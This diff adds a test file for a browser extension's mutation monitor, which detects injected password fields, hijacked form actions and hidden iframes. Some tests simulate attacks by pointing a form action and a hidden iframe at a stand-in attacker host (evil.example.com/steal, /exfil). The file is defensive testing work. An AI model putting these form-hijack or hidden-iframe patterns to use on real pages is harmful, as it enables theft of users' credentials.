@@ -1,0 +1,260 @@
+import { describe, expect, it, beforeEach, afterEach, vi } from "vitest";
+
+// The mutation monitor relies on DOM APIs (MutationObserver, getComputedStyle,
+// getBoundingClientRect). We test the pure-logic paths directly and use
+// lightweight stubs for the DOM-dependent parts.
+
+// We import the module functions. Because the module manages internal state
+// we reset between tests.
+import {
+  startMutationMonitor,
+  stopMutationMonitor,
+  getMutationAlerts,
+  getMutationAlertCount,
+  _resetMutationState,
+  type MutationAlert,
+} from "../extension/src/content/mutation_monitor";
+
+const hasDOM = typeof globalThis.document !== "undefined";
+
+// ---------------------------------------------------------------------------
+// Helper to collect alerts
+// ---------------------------------------------------------------------------
+
+function collectAlerts(): MutationAlert[] {
+  const collected: MutationAlert[] = [];
+  return collected;
+}
+
+// ---------------------------------------------------------------------------
+// Unit tests that work WITHOUT a full DOM
+// ---------------------------------------------------------------------------
+
+describe("mutation_monitor module API", () => {
+  beforeEach(() => {
+    _resetMutationState();
+  });
+
+  afterEach(() => {
+    _resetMutationState();
+  });
+
+  it("exports the expected public API", () => {
+    expect(typeof startMutationMonitor).toBe("function");
+    expect(typeof stopMutationMonitor).toBe("function");
+    expect(typeof getMutationAlerts).toBe("function");
+    expect(typeof getMutationAlertCount).toBe("function");
+  });
+
+  it("getMutationAlerts returns empty array before start", () => {
+    expect(getMutationAlerts()).toEqual([]);
+    expect(getMutationAlertCount()).toBe(0);
+  });
+
+  it("getMutationAlerts returns a copy, not a reference", () => {
+    const a = getMutationAlerts();
+    const b = getMutationAlerts();
+    expect(a).not.toBe(b);
+    expect(a).toEqual(b);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// DOM-dependent tests (run only when DOM is available, e.g., jsdom/happy-dom)
+// ---------------------------------------------------------------------------
+
+describe("mutation_monitor DOM integration", () => {
+  beforeEach(() => {
+    _resetMutationState();
+    vi.useFakeTimers({ shouldAdvanceTime: true });
+  });
+
+  afterEach(() => {
+    _resetMutationState();
+    vi.useRealTimers();
+  });
+
+  it.skipIf(!hasDOM)("starts and stops without error", () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+    expect(getMutationAlertCount()).toBe(0);
+    stopMutationMonitor();
+  });
+
+  it.skipIf(!hasDOM)("detects password field injection into existing form", async () => {
+    const alerts: MutationAlert[] = [];
+    const form = document.createElement("form");
+    document.body.appendChild(form);
+
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // Inject a password field after monitor starts
+    const input = document.createElement("input");
+    input.type = "password";
+    form.appendChild(input);
+
+    // Flush debounce
+    vi.advanceTimersByTime(150);
+
+    // MutationObserver callbacks are microtasks; allow them to resolve
+    await vi.advanceTimersByTimeAsync(150);
+
+    expect(alerts.length).toBeGreaterThanOrEqual(1);
+    expect(alerts[0]!.type).toBe("password_injected");
+
+    // Clean up
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it.skipIf(!hasDOM)("detects input type changed to password", async () => {
+    const alerts: MutationAlert[] = [];
+    const input = document.createElement("input");
+    input.type = "text";
+    document.body.appendChild(input);
+
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    input.setAttribute("type", "password");
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const passwordAlerts = alerts.filter((a) => a.type === "password_injected");
+    expect(passwordAlerts.length).toBeGreaterThanOrEqual(1);
+
+    input.remove();
+    stopMutationMonitor();
+  });
+
+  it.skipIf(!hasDOM)("detects form action attribute change", async () => {
+    const alerts: MutationAlert[] = [];
+    const form = document.createElement("form");
+    form.setAttribute("action", "/login");
+    document.body.appendChild(form);
+
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    form.setAttribute("action", "https://evil.example.com/steal");
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
+    expect(actionAlerts.length).toBeGreaterThanOrEqual(1);
+    expect(actionAlerts[0]!.details).toContain("evil.example.com");
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it.skipIf(!hasDOM)("does not alert for form action unchanged", async () => {
+    const alerts: MutationAlert[] = [];
+    const form = document.createElement("form");
+    form.setAttribute("action", "/login");
+    document.body.appendChild(form);
+
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // Set it to the same value
+    form.setAttribute("action", "/login");
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
+    expect(actionAlerts.length).toBe(0);
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it.skipIf(!hasDOM)("detects suspicious hidden iframe injection", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const iframe = document.createElement("iframe");
+    iframe.style.display = "none";
+    iframe.src = "https://evil.example.com/exfil";
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.length).toBeGreaterThanOrEqual(1);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it.skipIf(!hasDOM)("ignores legitimate reCAPTCHA iframes", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const iframe = document.createElement("iframe");
+    iframe.src = "https://www.google.com/recaptcha/api2/anchor";
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.length).toBe(0);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it.skipIf(!hasDOM)("caps alerts at 50", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // Inject 60 password fields rapidly
+    const inputs: HTMLInputElement[] = [];
+    for (let i = 0; i < 60; i++) {
+      const input = document.createElement("input");
+      input.type = "password";
+      document.body.appendChild(input);
+      inputs.push(input);
+    }
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    expect(getMutationAlertCount()).toBeLessThanOrEqual(50);
+
+    for (const input of inputs) input.remove();
+    stopMutationMonitor();
+  });
+
+  it.skipIf(!hasDOM)("auto-disconnects after 5 minutes", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // Advance past the 5-minute auto-disconnect
+    vi.advanceTimersByTime(5 * 60 * 1000 + 100);
+
+    // Inject something after disconnect -- should NOT produce alert
+    const input = document.createElement("input");
+    input.type = "password";
+    document.body.appendChild(input);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const passwordAlerts = alerts.filter((a) => a.type === "password_injected");
+    expect(passwordAlerts.length).toBe(0);
+
+    input.remove();
+  });
+
+  it.skipIf(!hasDOM)("stopMutationMonitor prevents further alerts", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+    stopMutationMonitor();
+
+    const input = document.createElement("input");
+    input.type = "password";
+    document.body.appendChild(input);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    expect(alerts.length).toBe(0);
+
+    input.remove();
+  });
+});
